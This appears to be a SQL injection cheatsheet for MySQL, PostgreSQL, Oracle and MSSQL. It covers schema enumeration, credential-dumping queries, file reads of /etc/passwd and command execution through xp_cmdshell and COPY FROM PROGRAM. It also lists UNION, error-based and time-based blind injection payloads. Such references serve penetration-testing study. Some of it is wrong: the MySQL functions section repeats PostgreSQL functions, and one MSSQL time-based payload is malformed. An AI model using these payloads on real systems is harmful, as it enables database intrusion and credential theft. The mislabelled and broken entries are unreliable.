# SQL Enumeration Cheatsheet

## 1. MySQL (Reference)

### 1.1 List all Databases

```sql
SELECT schema_name FROM information_schema.schemata;
```

### 1.2 List all tables in the current DB

```sql
SELECT table_name FROM information_schema.tables WHERE table_schema=database();
```

### 1.3 List all tables from a different DB

```sql
SELECT table_name FROM information_schema.tables WHERE table_schema='app';
```

### 1.4 List all columns in the current DB

```sql
SELECT column_name FROM information_schema.columns WHERE table_name='test_table';
```

### 1.5 List all columns in a different DB

```sql
SELECT column_name FROM information_schema.columns WHERE table_schema='app' AND table_name='test_table';
```

### 1.6 Extract records from chosen columns (current DB)

```sql
SELECT GROUP_CONCAT(user,'@@',passwd) FROM test_table;
```

### 1.7 Extract records from a different DB

```sql
SELECT GROUP_CONCAT(user,'@@',passwd) FROM app.test_table;
```

### 1.8 MySQL Specific - Useful functions

```sql
-- Current user
SELECT current_user;
SELECT user;

-- Current database
SELECT current_database();

-- Version
SELECT version();

-- List all users
SELECT usename FROM pg_user;

-- Read files (if permissions allow)
SELECT pg_read_file('/etc/passwd');

-- Command execution (if pg_execute_server_program extension)
COPY cmd_output FROM PROGRAM 'id';
```
---

## 2. PostgreSQL

### 2.1 List all Databases

```sql
SELECT datname FROM pg_database;
-- ou
SELECT schema_name FROM information_schema.schemata;
```

### 2.2 List all tables in the current DB/schema

```sql
SELECT table_name FROM information_schema.tables WHERE table_schema='public';
-- ou pour le schema courant
SELECT tablename FROM pg_tables WHERE schemaname='public';
```

### 2.3 List all tables from a different schema

```sql
SELECT table_name FROM information_schema.tables WHERE table_schema='app';
```

### 2.4 List all columns in a table

```sql
SELECT column_name FROM information_schema.columns WHERE table_name='test_table';
```

### 2.5 List all columns in a different schema

```sql
SELECT column_name FROM information_schema.columns WHERE table_schema='app' AND table_name='test_table';
```

### 2.6 Extract records from chosen columns (current schema)

```sql
SELECT STRING_AGG(user || '@@' || passwd, ',') FROM test_table;
-- ou sans agrégation
SELECT user || '@@' || passwd FROM test_table;
```

### 2.7 Extract records from a different schema

```sql
SELECT STRING_AGG(user || '@@' || passwd, ',') FROM app.test_table;
```

### 2.8 PostgreSQL Specific - Useful functions

```sql
-- Current user
SELECT current_user;
SELECT user;

-- Current database
SELECT current_database();

-- Version
SELECT version();

-- List all users
SELECT usename FROM pg_user;

-- Read files (if permissions allow)
SELECT pg_read_file('/etc/passwd');

-- Command execution (if pg_execute_server_program extension)
COPY cmd_output FROM PROGRAM 'id';
```

---

## 3. Oracle

### 3.1 List all Databases (Tablespaces)

```sql
SELECT tablespace_name FROM dba_tablespaces;
-- ou pour les schemas/users
SELECT username FROM all_users;
```

### 3.2 List all tables accessible to current user

```sql
SELECT table_name FROM all_tables WHERE owner=USER;
-- ou toutes les tables accessibles
SELECT table_name FROM all_tables;
```

### 3.3 List all tables from a different schema

```sql
SELECT table_name FROM all_tables WHERE owner='APP';
```

### 3.4 List all columns in a table

```sql
SELECT column_name FROM all_tab_columns WHERE table_name='TEST_TABLE';
```

### 3.5 List all columns in a different schema

```sql
SELECT column_name FROM all_tab_columns WHERE owner='APP' AND table_name='TEST_TABLE';
```

### 3.6 Extract records from chosen columns (current schema)

```sql
SELECT LISTAGG(username || '@@' || passwd, ',') WITHIN GROUP (ORDER BY username) FROM test_table;
-- ou concaténation simple
SELECT username || '@@' || passwd FROM test_table;
```

### 3.7 Extract records from a different schema

```sql
SELECT username || '@@' || passwd FROM app.test_table;
```

### 3.8 Oracle Specific - Useful queries

```sql
-- Current user
SELECT user FROM dual;

-- Current database
SELECT ora_database_name FROM dual;

-- Version
SELECT banner FROM v$version WHERE ROWNUM=1;

-- All users
SELECT username FROM all_users;

-- Privileges
SELECT * FROM user_sys_privs;

-- Tables du dictionnaire (metadata)
SELECT * FROM dictionary;

-- Dual table pour tests
SELECT 'test' FROM dual;
```

**Oracle - Important Notes:**

- Oracle utilise `||` pour la concaténation
- Les noms de tables/colonnes sont souvent en MAJUSCULES
- `DUAL` est une table système pour les requêtes sans table
- Pas de `LIMIT`, utiliser `ROWNUM` ou `FETCH FIRST n ROWS ONLY` (12c+)

---

## 4. Microsoft SQL Server (MSSQL)

### 4.1 List all Databases

```sql
SELECT name FROM master.sys.databases;
-- ou
SELECT name FROM sys.databases;
-- ou ancienne méthode
EXEC sp_databases;
```

### 4.2 List all tables in the current DB

```sql
SELECT table_name FROM information_schema.tables WHERE table_type='BASE TABLE';
-- ou
SELECT name FROM sys.tables;
```

### 4.3 List all tables from a different DB

```sql
SELECT table_name FROM app.information_schema.tables WHERE table_type='BASE TABLE';
-- ou
SELECT name FROM app.sys.tables;
```

### 4.4 List all columns in the current DB

```sql
SELECT column_name FROM information_schema.columns WHERE table_name='test_table';
-- ou
SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('test_table');
```

### 4.5 List all columns in a different DB

```sql
SELECT column_name FROM app.information_schema.columns WHERE table_name='test_table';
```

### 4.6 Extract records from chosen columns (current DB)

```sql
SELECT STRING_AGG(username + '@@' + passwd, ',') FROM test_table;
-- ou pour versions < 2017
SELECT username + '@@' + passwd FROM test_table;
-- avec FOR XML PATH (toutes versions)
SELECT STUFF((SELECT ',' + username + '@@' + passwd FROM test_table FOR XML PATH('')), 1, 1, '');
```

### 4.7 Extract records from a different DB

```sql
SELECT username + '@@' + passwd FROM app.dbo.test_table;
```

### 4.8 MSSQL Specific - Useful queries

```sql
-- Current user
SELECT CURRENT_USER;
SELECT SYSTEM_USER;
SELECT USER_NAME();

-- Current database
SELECT DB_NAME();

-- Version
SELECT @@VERSION;

-- Server name
SELECT @@SERVERNAME;

-- All logins
SELECT name FROM sys.sql_logins;

-- Check if sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Linked servers (for pivoting)
EXEC sp_linkedservers;

-- xp_cmdshell (command execution if enabled)
EXEC xp_cmdshell 'whoami';

-- Enable xp_cmdshell (requires sysadmin)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- List table
 select * from app.information_schema.tables;
 select * from app.sys.tables;
```

### 4.9 MSSQL - Stacked Queries

```sql
-- MSSQL supporte les stacked queries (;)
SELECT 1; SELECT 2;

-- Utile pour injection
'; EXEC xp_cmdshell 'whoami';--
```

---
---

## 5. Quick Reference Table

| Action                     | MySQL                          | PostgreSQL             | Oracle               | MSSQL                   |
| -------------------------- | ------------------------------ | ---------------------- | -------------------- | ----------------------- |
| **Concat**                 | `CONCAT()` ou `GROUP_CONCAT()` | `\|` ou `STRING_AGG()` | `\|` ou `LISTAGG()`  | `+` ou `STRING_AGG()`   |
| **Current User**           | `USER()`                       | `current_user`         | `USER`               | `CURRENT_USER`          |
| **Current DB**             | `DATABASE()`                   | `current_database()`   | `ora_database_name`  | `DB_NAME()`             |
| **Version**                | `@@VERSION`                    | `version()`            | `v$version`          | `@@VERSION`             |
| **Comment single line**    | `--` ou `#`                    | `--`                   | `--`                 | `--`                    |
| **Comment multiple lines** | `/* */`                        | `/* */`                | `/* */`              | `/* */`                 |
| **Limit**                  | `LIMIT n`                      | `LIMIT n`              | `ROWNUM<=n`          | `TOP n`                 |
| **String delimiter**       | `'` ou `"`                     | `'`                    | `'`                  | `'`                     |
| **Stacked queries**        | Oui (selon driver)             | Oui                    | Non                  | Oui                     |
| Sleep/Delay                | `SLEEP(n)`                     | `pg_sleep(n)`          | `DBMS_LOCK.SLEEP(n)` | `WAITFOR DELAY '0:0:n'` |

---
---

## 6. UNION-Based Injection - Column Count Discovery

**MySQL / PostgreSQL / MSSQL:**

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
-- Continue jusqu'à erreur

-- Ou avec UNION
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

**Oracle:**

```sql
' ORDER BY 1--
' UNION SELECT NULL FROM dual--
' UNION SELECT NULL,NULL FROM dual--
```

---

## 7. Error-Based Injection Payloads

**MySQL:**

```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--
```

**PostgreSQL:**

```sql
' AND 1=CAST((SELECT version()) AS INT)--
```

**Oracle:**

```sql
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--
```

**MSSQL:**

```sql
' AND 1=CONVERT(INT,(SELECT @@version))--
' AND 1=(SELECT TOP 1 username FROM users)--
```

---

## 8. Time-Based Blind Injection

**MySQL:**

```sql
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND BENCHMARK(5000000,SHA1('test'))--
```

**PostgreSQL:**

```sql
'; SELECT pg_sleep(5)--
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
```

**Oracle:**

```sql
' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--
' AND 1=(SELECT CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END FROM dual)--
```

**MSSQL:**

```sql
'; WAITFOR DELAY '0:0:5'--
' AND IF(1=1) WAITFOR DELAY '0:0:5'--
```